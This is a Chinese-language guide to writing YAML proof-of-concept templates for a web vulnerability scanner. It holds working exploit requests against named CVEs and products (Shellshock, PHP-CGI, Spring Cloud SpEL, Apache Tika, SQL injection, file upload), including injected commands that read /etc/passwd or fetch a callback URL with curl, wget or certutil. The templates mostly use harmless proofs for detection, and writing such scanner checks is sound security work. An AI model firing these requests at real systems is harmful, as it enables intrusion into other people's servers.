# POC编写模板
## HTTP
### 常规正则匹配规范
#### 文件类
```yaml
- /etc/passwd
  - "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
- c:/windows/win.ini
  - response.body_string.contains("for 16-bit app support")
```
#### 命令类（原则上，在不能使用expr等操作时才可使用以下命令进行证明）
```yaml
- id
  - "(u|g)id=\\d+".matches(response.body_string) && response.body_string.contains("root")
  - 注意，该匹配方式不能单独使用，请结合其他信息一起使用(例如上述的root)，例如添加headers中的特殊信息，或者前一个规则比较强等
- ls
  - 使用该命令一般是在IOT环境下，确认ls的目录中某些文件不会发生变动的情况下，可以匹配返回的文件名称
- rev
  - echo {{randstr}} | rev
  - response.body_string.contains(rev(randstr))
```
### 常规漏洞检测模版

#### 未授权类

<!-- tabs:start -->

#### **基本示例**

```yaml
name: poc-yaml-test-unauth
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /admin/
    expression: response.status == 200 && response.body_string.contains("<title>Admin</title>") && response.body_string.contains("<h2>DController</h2>")
expression: r0()
detail:
  author: test
  links:
    - https://www.test.com
```

#### **Docker 未授权访问**

```yaml
name: poc-yaml-docker-registry-api-unauth
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /v2/
      follow_redirects: false
    expression: response.status == 200 && "docker-distribution-api-version" in response.headers && response.headers["docker-distribution-api-version"].contains("registry/2.0")
  r1:
    request:
      cache: true
      method: GET
      path: /v2/_catalog
      follow_redirects: false
    expression: response.status == 200 && response.content_type.contains("application/json") && response.body.bcontains(b"repositories")
expression: r0() && r1()
detail:
  author: Chaitin
  links:
    - https://github.com/distribution/distribution/issues/877
    - https://askding.github.io/Kali/Exploit/Docker.html
```

<!-- tabs:end -->

#### 文件读取类
##### 系统文件

<!-- tabs:start -->

##### **基本示例**

```yaml
name: poc-yaml-test
manual: true
transport: http
rules:
  linux:
    request:
      cache: true
      method: GET
      path: /test/../../../../etc/passwd
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  windows:
    request:
      cache: true
      method: GET
      path: /test/../../../../Windows/win.ini
    expression: response.status == 200 && response.body_string.contains("for 16-bit app support")
expression: linux() || windows()
detail:
  author: test
  links:
    - https://www.test.com
```

##### **EWebs**

```yaml
name: poc-yaml-ewebs-fileread
manual: true
transport: http
rules:
  windows0:
    request:
      cache: true
      method: POST
      path: /casmain.xgi
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: Language_S=../../../../windows/win.ini
    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: windows0()
detail:
  author: Chaitin
  links:
    - https://www.yuque.com/peiqiwiki/peiqi-poc-wiki/lzqqz4
```

<!-- tabs:end -->

##### 网站配置文件

<!-- tabs:start -->

##### **基本示例**

```yaml
name: poc-yaml-test
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /test.aspx?filePath=../../web.config
      follow_redirects: true
    expression: response.body_string.contains("<add key=\"MyServerIP\"") && response.body_string.contains("<add name=\"ConnectionString\" connectionString=\"") && response.body_string.contains("<sessionState mode=\"InProc\"")
expression: r0()
detail:
  author: test
  links:
    - https://www.test.com
```

##### **CVE-2021-26086**

```yaml
name: poc-yaml-jira-cve-2020-29453-fileread
manual: true
transport: http
set:
  randstr: randomLowercase(10)
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /s/{{randstr}}/_/%2e/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml
    expression: response.status == 200 && response.body.bcontains(b"<groupId>com.atlassian.jira</groupId>") && response.body.bstartsWith(b"<project xmlns=")
  r1:
    request:
      cache: true
      method: GET
      path: /s/{{randstr}}/_/%2e/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
    expression: response.status == 200 && response.body.bcontains(b"<groupId>com.atlassian.jira</groupId>") && response.body.bstartsWith(b"<project xmlns=")
expression: r0() || r1()
detail:
  author: Xz
  links:
    - https://jira.atlassian.com/browse/JRASERVER-72014
    - https://nvd.nist.gov/vuln/detail/CVE-2020-29453
```

<!-- tabs:end -->

#### RCE类
##### 代码执行 (Code Execution)

<!-- tabs:start -->

##### **基本示例**
```yaml
name: poc-yaml-test-php-rce
manual: true
transport: http
set:
  s1: randomInt(100000000, 200000000)
  s2: randomInt(10000, 20000)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /index.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: <?={{s1}}-{{s2}};
    expression: response.status == 200 && response.body_string.contains(string(s1 - s2))
expression: r0()
detail:
  author: test
  links:
    - https://test.com
```

##### **CVE-2012-1823**

```yaml
name: poc-yaml-php-cgi-cve-2012-1823-rce
manual: true
transport: http
set:
  s1: randomInt(100000, 200000)
  s2: randomInt(100000, 200000)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: <?php print({{s1}} + {{s2}}); ?>
    expression: response.status == 200 && response.body_string.startsWith(string(s1 + s2))
expression: r0()
detail:
  author: Chaitin
  links:
    - https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823
```

##### **Spring-Cloud SPEL**

```yaml
name: poc-yaml-spring-cloud-function-spel-rce
manual: true
transport: http
set:
  reverse: newReverse()
  reverseUrl: reverse.url
  randomString: randomLowercase(6)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /functionRouter
      headers:
        Content-Type: application/x-www-form-urlencoded
        spring.cloud.function.routing-expression: new java.net.URL("{{reverseUrl}}").openStream()
      body: |
        {{randomString}}
    expression: reverse.wait(5)
expression: r0()
detail:
  author: Chaitin
  links:
    - https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f
  AffectedVersion: 3.2.2
  description: spring cloud function <= 3.2.2 会对特定的header进行SPEL解析,导致RCE
```

<!-- tabs:end -->
在随机数过小的情况下，可能还是会出现误报，所以，请在适当的时候，活用`bstartsWith`方法或者尝试匹配**网页中的其他特征**。

> 例如，计算的结果直接返回，并无其他附加，那么这个时候就可以使用`response.body.bstartsWith(bytes(string(s1 - s2)))`

##### 命令执行 (Command Execution)

<!-- tabs:start -->

##### **基本示例**

```yaml
name: poc-yaml-test-rce
manual: true
transport: http
set:
  s1: randomInt(100000, 200000)
  s2: randomInt(10000, 20000)
rules:
  # windows的情况
  r0:
    request:
      cache: true
      method: POST
      path: /test
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        id=set /A {{s1}}-{{s2}}
    expression: response.status == 200 && response.body_string.contains(string(s1 - s2))
  r1:
    request:
      cache: true
      method: POST
      path: /test2
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        id=type c:/windows/win.ini
    expression: response.status == 200 && response.body_string.contains("for 16-bit app support")
  # linux的情况
  r2:
    request:
      cache: true
      method: POST
      path: /test
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        id=expr {{s1}} - {{s2}}
    expression: response.status == 200 && response.body_string.contains(string(s1 - s2))
  r3:
    request:
      cache: true
      method: POST
      path: /test
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        id=echo {{s1}}-{{s2}}|bc
    expression: response.status == 200 && response.body_string.contains(string(s1 - s2))
  r4:
    request:
      cache: true
      method: POST
      path: /test1
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        id=cat /etc/passwd
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0() || r1() || r2() || r3() || r4()
detail:
  author: test
  links:
    - http://test.com
```

##### **蓝海卓越**

```yaml
name: poc-yaml-langhezhuoyuejifei-debug-rce
manual: true
transport: http
set:
  s1: randomInt(100000, 200000)
  s2: randomInt(10000, 20000)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /debug.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        cmd=set /A {{s1}}-{{s2}}
    expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2)))
  r1:
    request:
      cache: true
      method: POST
      path: /debug.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        cmd=type c:/windows/win.ini
    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
  r2:
    request:
      cache: true
      method: POST
      path: /debug.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        cmd=expr {{s1}} - {{s2}}
    expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2)))
  r3:
    request:
      cache: true
      method: POST
      path: /debug.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        cmd=echo {{s1}}-{{s2}}|bc
    expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2)))
  r4:
    request:
      cache: true
      method: POST
      path: /debug.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        cmd=cat /etc/passwd
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0() || r1() || r2() || r3() || r4()
detail:
  author: Chaitin
  links:
    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20debug.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
```

充分考虑了目标在不同系统中的情况表现

##### **CVE-2021-42071**

```yaml
name: poc-yaml-visual-tools-dvr-vx16-cve-2021-42071
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /cgi-bin/slogin/login.py
      headers:
        Accept: '*/*'
        User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd
      follow_redirects: false
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
detail:
  author: Chaitin
  links:
    - https://www.exploit-db.com/exploits/50098
```

<!-- tabs:end -->

##### 无回显RCE

<!-- tabs:start -->

##### **基本示例**

```yaml
name: poc-yaml-test
manual: true
transport: http
set:
  reverse: newReverse()
  reverseURL: reverse.url
  reverseDomain: reverse.domain
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /run
      body: test=ls|curl+{{reverseURL}}
    expression: reverse.wait(5)
  r1:
    request:
      cache: true
      method: POST
      path: /run
      body: test=ls|ping+reverseDomain
    expression: reverse.wait(5)
expression: r0() || r1()
detail:
  author: test
  links:
    - http://test.com
```

##### **CVE-2022-0591(cURL/Wget)**

```yaml
name: poc-yaml-spiderflow-save-remote-command-execute
manual: true
transport: http
set:
  reverse: newReverse()
  reverseURL: reverse.url
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /function/save
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: id=&name=cmd&parameter=yw&script=}Java.type('java.lang.Runtime').getRuntime().exec('curl {{reverseURL}}');{
      follow_redirects: false
    expression: response.status == 200 && reverse.wait(5)
expression: r0()
detail:
  author: Chaitin
  links:
    - https://github.com/GREENHAT7/pxplan/blob/main/goby_pocs/SpiderFlow_save__remote_code.json
```

##### **CVE-2018-1335(Ping)**

```yaml
name: poc-yaml-tika-cve-2018-1335-rce
manual: true
transport: http
set:
  reverse: newReverse()
  reverseDNS: reverse.domain
rules:
  r0:
    request:
      cache: true
      method: PUT
      path: /meta
      headers:
        Connection: close
        Content-Type: image/jp2
        Expect: 100-continue
        X-Tika-OCRLanguage: //E:Jscript
        X-Tika-OCRTesseractPath: '"cscript"'
      body: |
        var oShell = WScript.CreateObject("WScript.Shell");var oExec = oShell.Exec('cmd /c ping {{reverseDNS}}');
    expression: reverse.wait(5) && response.body.bcontains(b"org.apache.tika.parser.DefaultParser") && response.headers["Content-Type"].contains("text/csv")
expression: r0()
detail:
  author: Chaitin
  links:
    - https://www.exploit-db.com/exploits/46540
```

##### **蓝凌OA(Certutils)**

```yaml
name: poc-yaml-landray-oa-datajson-rce
manual: true
transport: http
set:
  reverse: newReverse()
  reverseURL: reverse.url
rules:
  r1:
    request:
      cache: true
      method: GET
      path: /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("wget -P /tmp/ {{reverseURL}}")&type=1
    expression: response.body_string.contains("模拟通过") && reverse.wait(3)
  r2:
    request:
      cache: true
      method: GET
      path: /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("certutil -urlcache -split -f {{reverseURL}}")&type=1
    expression: response.body_string.contains("模拟通过") && reverse.wait(3)
expression: r1() || r2()
detail:
  author: xiaobaicai
  links:
    - https://www.cnsuc.net/thread-553.htm
```

<!-- tabs:end -->
#### SQL注入类
##### 普通注入

<!-- tabs:start -->

##### **基本示例**

```yaml
name: poc-yaml-test-sqli
manual: true
transport: http
set:
  s1: randomInt(100000, 200000)
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /index.jsp?id=1%27%20union%20select%20md5({{s1}})
      follow_redirects: true
    expression: response.body_string.contains(substr(md5(string(s1)), 2, 28))
expression: r0()
detail:
  author: test
  links:
    - https://www.test.com
```

##### **CVE-2020-22211(MD5/Hash)**

```yaml
name: poc-yaml-74cms-cve-2020-22211-sqli
manual: true
transport: http
set:
  rand: randomInt(100000, 200000)
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /plus/ajax_street.php?act=key&key=%E9%8C%A6%27%20union%20select%201,2,3,4,5,6,7,md5({{rand}}),9%23
    expression: |
      response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
expression: r0()
detail:
  author: Chaitin
  links:
    - https://github.com/blindkey/cve_like/issues/13
```

##### **CVE-2019-16997(数值运算)**

```yaml
name: poc-yaml-metinfo-cve-2019-16997-sqli
manual: true
transport: http
set:
  r1: randomInt(40000, 44800)
  r2: randomInt(40000, 44800)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /admin/?n=language&c=language_general&a=doExportPack
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: appno= 1 union SELECT {{r1}}*{{r2}},1&editor=cn&site=web
      follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
expression: r0()
detail:
  author: Chaitin
  links:
    - https://y4er.com/post/metinfo7-sql-tips/#sql-injection-2
```

<!-- tabs:end -->

##### 报错注入

<!-- tabs:start -->

##### **基本示例**

```yaml
name: poc-yaml-test-sqli
manual: true
transport: http
set:
  s1: randomInt(100000, 200000)
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /index.jsp?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20md5({{s1}})),0x7e),1)--
      follow_redirects: true
    expression: response.body_string.contains(substr(md5(string(s1)), 2, 28))
expression: r0()
detail:
  author: test
  links:
    - https://www.test.com
```

##### **CVE-2018-6893**

```yaml
name: poc-yaml-finecms-cve-2018-6893
manual: true
transport: http
set:
  f1: randomLowercase(5)
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /index.php?s=member&c=api&m=checktitle&id=13&title=123&module=news,(select%20extractvalue(1,concat(0x7e,md5('{{f1}}'),0x7e)))%20as%20aaa
      follow_redirects: false
    expression: response.status == 500 && response.body.bcontains(bytes(substr(md5(f1), 2, 20)))
expression: r0()
detail:
  author: Chaitin
  links:
    - https://xz.aliyun.com/t/2050
```

<!-- tabs:end -->
##### 布尔盲注

<!-- tabs:start -->

##### **基本示例**

```yaml
name: poc-yaml-test
manual: true
transport: http
set:
  s1: randomLowercase(5)
  a1: randomInt(10000, 100000)
  a2: randomInt(10000, 100000)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /test
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: id=aaa%27 and {{a1}}={{a2}} and %27{{s1}}%27=%27{{s1}}
      follow_redirects: true
    expression: response.body_string.contains("User authentication Failed")
  r1:
    request:
      cache: true
      method: POST
      path: /test
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: id=aaa%27 and {{a1}}={{a1}} and %27{{s1}}%27=%27{{s1}}
      follow_redirects: true
    expression: response.body_string.contains("User Login Failed for XXXXXX User")
expression: r0() && r1()
detail:
  author: test
  links:
    - https://www.test.com
```

##### **CVE—2022-29383**

```yaml
name: poc-yaml-netgear-ssl-vpn-20211222-cve-2022-29383
manual: true
transport: http
set:
  s1: randomLowercase(5)
  a1: randomInt(1000, 9000)
  a2: randomInt(1000, 9000)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /scgi-bin/platform.cgi
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: thispage=index.htm&USERDBUsers.UserName=aaa&USERDBUsers.Password=aaa&USERDBDomains.Domainname=geardomain%27 and {{a1}}={{a2}} and %27{{s1}}%27=%27{{s1}}&button.login.USERDBUsers.router_status=Login&Login.userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%3B+Trident%2F7.0%3B+.NET4.0C%3B+.NET4.0E%3B+.NET+CLR+2.0.50727%3B+.NET+CLR+3.0.30729%3B+.NET+CLR+3.5.30729%3B+rv%3A11.0%29+like+Gecko
      follow_redirects: true
    expression: response.body.bcontains(b"id=\"lblWarning\">User authentication Failed")
  r1:
    request:
      cache: true
      method: POST
      path: /scgi-bin/platform.cgi
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: thispage=index.htm&USERDBUsers.UserName=aaa&USERDBUsers.Password=aaa&USERDBDomains.Domainname=geardomain%27 and {{a1}}={{a1}} and %27{{s1}}%27=%27{{s1}}&button.login.USERDBUsers.router_status=Login&Login.userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%3B+Trident%2F7.0%3B+.NET4.0C%3B+.NET4.0E%3B+.NET+CLR+2.0.50727%3B+.NET+CLR+3.0.30729%3B+.NET+CLR+3.5.30729%3B+rv%3A11.0%29+like+Gecko
      follow_redirects: true
    expression: response.body.bcontains(b"id=\"lblWarning\">User Login Failed for SSLVPN User")
expression: r0()
detail:
  author: Chaitin
  links:
    - https://github.com/badboycxcc/Netgear-ssl-vpn-20211222-CVE-2022-29383
```

<!-- tabs:end -->

##### 时间盲注

<!-- tabs:start -->

##### **基本示例**

```yaml
name: poc-yaml-test-sqli
manual: true
transport: http
set:
  sleepSecond1: randomInt(6, 8)
  sleepSecond2: randomInt(3, 5)
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /user/test.php?id=1%27)%20AND%20(SELECT(SELECT(SLEEP(0))))%23
    expression: response.status == 200
    output:
      r0latency: response.latency
  r1:
    request:
      cache: true
      method: GET
      path: /user/test.php?id=1%27)%20AND%20(SELECT(SELECT(SLEEP({{sleepSecond1}}))))%23
    expression: response.latency - r0latency >= sleepSecond1 * 1000 - 1000
  r2:
    request:
      cache: true
      method: GET
      path: /user/test.php?id=1%27)%20AND%20(SELECT(SELECT(SLEEP({{sleepSecond2}}))))%23
    expression: response.latency - r0latency >= sleepSecond2 * 1000 - 1000
expression: r0() && r1() && r2()
detail:
  author: test
  links:
    - http://test.com
```

##### **CVE-2023-23488**

```yaml
name: poc-yaml-wordpress-paid-memberships-pro-cve-2023-23488-sqli
manual: true
transport: http
set:
  sleepSecond: randomInt(5, 7)
  sleepSecond1: randomInt(2, 4)
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(0)))a)--%20-
    expression: response.status == 200 && response.headers["Content-Type"].contains("json") && response.body_string.contains("{")
    output:
      r0latency: response.latency
  r1:
    request:
      cache: true
      method: GET
      path: /?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP({{sleepSecond}})))a)--%20-
    expression: response.latency - r0latency >= sleepSecond * 1000 - 500
  r2:
    request:
      cache: true
      method: GET
      path: /?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP({{sleepSecond1}})))a)--%20-
    expression: response.latency - r0latency >= sleepSecond1 * 1000 - 500
expression: r0() && r1() && r2()
detail:
  author: Chaitin
  links:
    - https://www.tenable.com/cve/CVE-2023-23488
```

<!-- tabs:end -->

#### SSRF/URL跳转类
目前暂时推荐使用example.com/example.org，后续会支持配置文件中动态获取
以下为具体示例，在不影响验证的情况下，推荐使用r0规则进行验证（URL跳转）
**ps**：在使用r0规则时，有两点需要注意：

1. 当存在多次跳转的情况时，请不要使用该规则
2. 当location中包含原本请求的url时，请谨慎使用该规则，可能导致验证失败

##### SSRF

<!-- tabs: start -->

##### **基本示例**

```yaml
name: poc-yaml-test-url
manual: true
transport: http
set:
  randomUrl: |
    "http://" + randomLowercase(6) + ".com"
  reverse: newReverse()
  reverseUrl: reverse.url
rules:
  r1:
    request:
      cache: true
      method: GET
      path: /user/test.php?url=example.com
      follow_redirects: true
    expression: response.status == 200 && response.body_string.contains("<title>Example Domain</title>") && response.body_string.contains("<h1>Example Domain</h1>")
  # 仅在SSRF访问不到外面的情况下使用反连进行测试
  r2:
    request:
      cache: true
      method: GET
      path: /user/test.php?url={{reverseUrl}}
    expression: response.status == 200 && reverse.wait(3)
expression: r1() || r2()
detail:
  author: test
  links:
    - http://test.com
```

##### **CVE-2022-0591(特殊的反连地址)**

```yaml
name: poc-yaml-wordpress-cve-2022-0591-ssrf
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /wp-admin/admin-ajax.php?action=formcraft3_get&URL=http://127.0.0.1:0
      follow_redirects: false
    expression: |
      response.status == 200 && response.body.bcontains(b"cURL error 3: ") && response.body.bcontains(b"failed")
expression: r0()
detail:
  author: Chaitin
  links:
    - https://wpscan.com/vulnerability/b5303e63-d640-4178-9237-d0f524b13d47
```

##### **KK FileView(访问外部站点)**

```yaml
name: poc-yaml-kkfileview-getcorsfile-ssrf
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /getCorsFile?urlPath=http://interact.sh
    expression: |
      response.status == 200 && response.body.bstartsWith(bytes("<h1> Interactsh Server </h1>")) && response.body.bcontains(bytes("is an open-source tool for detecting out-of-band interaction")) && response.url.domain != "interact.sh"
expression: r0()
detail:
  author: Chaitin
  links:
    - https://github.com/kekingcn/kkFileView/issues/128
```

##### **CVE-2017-9506(反连平台)**

```yaml
name: poc-yaml-jira-cve-2017-9506-ssrf
manual: true
transport: http
set:
  reverse: newReverse()
  reverseURL: reverse.url
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /plugins/servlet/oauth/users/icon-uri?consumerUri={{reverseURL}}
      headers:
        X-Atlassian-Token: no-check
    expression: reverse.wait(5)
expression: r0()
detail:
  author: Chaitin
  links:
    - https://ecosystem.atlassian.net/browse/OAUTH-344
```

<!-- tabs:end -->

#### 弱口令类
```yaml
name: poc-yaml-test
manual: true
transport: http
payloads:
  continue: false
  payloads:
  p1:
    username: |
      "kevinaaa"
    password: |
      "kevinbbb"
  p2:
    username: |
      "developeraaa"
    password: |
      "developerbbb"
rules:
  r1:
    request:
      method: POST
      path: /http/index.php
      follow_redirects: false
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: requester=login&username={{username}}&input_passwd={{password}}
  expression: response.status == 200 && "{(.*)result['\"]\\s*:\\s*true(.*)}".bmatches(response.body)
expression: r1()
detail:
  author: test
  links:
  - https://www.test.com
```
### 难以无害化漏洞检测模版
#### 文件删除
此类漏洞建议使用版本匹配的方式，或者匹配其他特征的方式侧面验证漏洞的存在，不要直接执行删除请求，以防对测试目标造成损害。
#### 文件修改
此类漏洞建议使用版本匹配的方式，或者匹配其他特征的方式侧面验证漏洞的存在，不要直接执行删除请求，以防对测试目标造成损害。
#### 文件上传

- `multipart/form-data; boundary=---------------------------16314487820932200903769468567`中的boundary应随机化
- 在上传的文件不能删除的情况下，可以选择继续上传一个同名空文件（请确保上传后的文件名称不被重命名），将原来的文件内容进行覆盖。
- 但常规情况下，在上传php，jsp文件时，可以使用一些函数来将上传的文件删除，示例如下：
    ```yaml
    name: poc-yaml-test
    manual: true
    transport: http
    set:
      r1: randomLowercase(20)
      r2: randomLowercase(20)
      rboundary: randomLowercase(8)
    rules:
      r0:
        request:
          cache: true
          method: POST
          path: /test
          headers:
            Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
          body: "\
            ------WebKitFormBoundary{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"file-upload\"; filename=\"{{r1}}.php\"\r\n\
            Content-Type: application/octet-stream\r\n\
            \r\n\
            <?php echo \"{{r2}}\"; unlink(__FILE__); ?>\r\n\
            ------WebKitFormBoundary{{rboundary}}--\r\n\
            "
          follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(r1)
        output:
          search: '"(?P<tmp>.+?)".bsubmatch(response.body)'
          tmp: search["tmp"]
      r1:
        request:
          cache: true
          method: GET
          path: /test/{{tmp}}/{{r1}}.php
          follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(r2)
    expression: r0() && r1()
    detail:
      author: test
      links:
        - https://test.com
    ```
    ```yaml
    name: poc-yaml-wanhuoa-upload-rce
    manual: true
    transport: http
    set:
      rfilename: randomLowercase(4)
      s1: randomInt(40000, 44800)
      s2: randomInt(40000, 44800)
      rboundary: randomLowercase(8)
    rules:
      r1:
        request:
          method: POST
          path: /test
          headers:
            Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
          body: "\
            ------WebKitFormBoundary{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"file\"; filename=\"{{rfilename}}.jsp\"\r\n\
            Content-Type: application/octet-stream\r\n\
            \r\n\
            <%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
            ------WebKitFormBoundary{{rboundary}}--\r\n\
            "
        expression: response.status == 200 && response.body_string.contains("success")
        output:
          search: |
            "\"data\":\"(?P<filename>\\d+).jsp\"".bsubmatch(response.body)
          uploadfilename: search["filename"]
      r2:
        request:
          method: GET
          path: /test/{{uploadfilename}}.jsp
        expression: response.status == 200 && response.body_string.contains(string(s1 * s2))
    expression: r1() && r2()
    detail:
      author: test
      links:
        - https://test.com
    ```
#### 账号/密码修改
此类漏洞建议使用版本匹配的方式，或者匹配其他特征的方式侧面验证漏洞的存在，不要直接执行删除请求，以防对测试目标造成损害。
### 特殊漏洞检测
#### 文件读取后，返回内容被编码
```yaml
name: poc-yaml-test
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /test
      headers:
        Content-Type: application/xml
      body: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall>\r\n<methodName>WorkflowService.getAttachment</methodName>\r\n<params><param><value><string>/etc/passwd</string>\r\n</value></param></params></methodCall>"
    expression: response.status == 200 && "root:[x*]:0:0:".matches(base64Decode("<base64>(?P<base64>.*)</base64>".bsubmatch(response.body)["base64"]))
expression: r0()
detail:
  author: test
  links:
    - https://www.test.com
```
#### Mssql unicode编码字符串
```yaml
name: poc-yaml-test
manual: true
transport: http
set:
    rs: randomLowercase(20)
rules:
    r0:
      request:
        method: GET
        path: /?sql=select UPPER('{{rs}}')
      expression: response.body_string.contains(upper(rs))
expression: r0()
detail:
    author: test
    links:
      - https://www.test.com
```
## TCP
### 常规服务漏洞
#### memcache未授权访问漏洞

```yaml=
name: poc-yaml-test
manual: false
transport: tcp
rules:
  r0:
    request:
      content: "stats"
      read_timeout: "3"
    expression: response.raw.bcontains(b"STAT pid") && response.raw.bcontains(b"STAT version")
    output:
      version: '"STAT version (?P<version>[\\d\\.]+)".bsubmatch(response.raw)["version"]'
      host: response.conn.destination.addr
expression: r0()
detail:
  author: test
  fingerprint:
    infos:
      - name: "memcache"
        version: "{{version}}"
    host_info:
      hostname: "{{host}}"
```

### 需要建立多个TCP连接进行验证的漏洞

可能类似这样的漏洞：CVE-2016-8704

参考连接：https://talosintelligence.com/vulnerability_reports/TALOS-2016-0219/